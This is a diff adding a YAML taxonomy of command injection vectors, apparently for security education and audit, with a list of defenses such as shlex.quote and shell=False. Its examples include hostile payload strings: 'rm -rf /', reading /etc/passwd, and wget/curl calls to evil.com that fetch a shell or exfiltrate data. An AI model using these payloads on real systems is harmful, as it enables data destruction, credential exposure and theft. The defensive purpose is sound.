@@ -1,0 +1,46 @@
+---
+# Command Injection Attack Vectors — taxonomy for education and audit
+
+attack_vectors:
+  shell_metacharacters:
+    description: "Shell metacharacter injection"
+    examples:
+      - "injection via semicolon: ; rm -rf /"
+      - "injection via pipe: | cat /etc/passwd"
+      - "injection via AND: && wget http://evil.com/shell.sh"
+      - "injection via OR: || curl http://evil.com/steal?data="
+      - "injection via backtick: `id`"
+      - "injection via command substitution: $(whoami)"
+  newline_injection:
+    description: "Newline/carriage-return injection"
+    examples:
+      - "URL-encoded newline: %0a"
+      - "Literal newline in input: \n"
+      - "CRLF injection: %0d%0a"
+  argument_injection:
+    description: "Argument/option injection"
+    examples:
+      - "--option=evil value"
+      - "--exec=malicious_command"
+      - "Positional argument overflow"
+  environment_injection:
+    description: "Environment variable injection"
+    examples:
+      - "PATH manipulation"
+      - "LD_PRELOAD injection"
+      - "PYTHONPATH manipulation"
+  subprocess_api_misuse:
+    description: "Subprocess API misuse patterns"
+    examples:
+      - "subprocess.run(cmd, shell=True) with string cmd"
+      - "os.system(user_input) without sanitization"
+      - "os.popen(user_input) without shell escaping"
+      - "commands.getoutput(user_input) — removed in Python 3"
+
+defense_strategies:
+  - "Use subprocess.run with args=list and shell=False (default)"
+  - "shlex.quote() for necessary shell escaping"
+  - "Allowlist validation: only permit known-safe characters/commands"
+  - "Parameterized command construction (never string concatenation)"
+  - "Least privilege: run with minimal necessary permissions"
+  - "Input length limits and character class restrictions"
